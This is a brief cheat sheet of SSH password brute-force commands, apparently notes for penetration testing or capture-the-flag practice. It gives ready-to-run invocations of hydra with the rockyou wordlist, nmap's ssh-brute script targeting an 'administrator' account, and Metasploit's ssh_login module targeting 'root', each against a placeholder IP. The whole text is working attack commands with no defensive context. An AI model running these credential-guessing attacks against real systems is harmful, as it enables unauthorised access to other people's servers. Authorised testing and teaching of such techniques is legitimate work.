##### Brute Force
```
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://IP
```

##### Brute Force 'Administrator' Password using Nmap
```
echo 'administrator' > users
nmap -p22 --script ssh-brute --script-args userdb=/root/users IP
```

##### Brute Force 'root' Password using Msfconsole
```
search ssh_login
use auxiliary/scanner/ssh/ssh_login
options
set rhosts IP
set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
run
```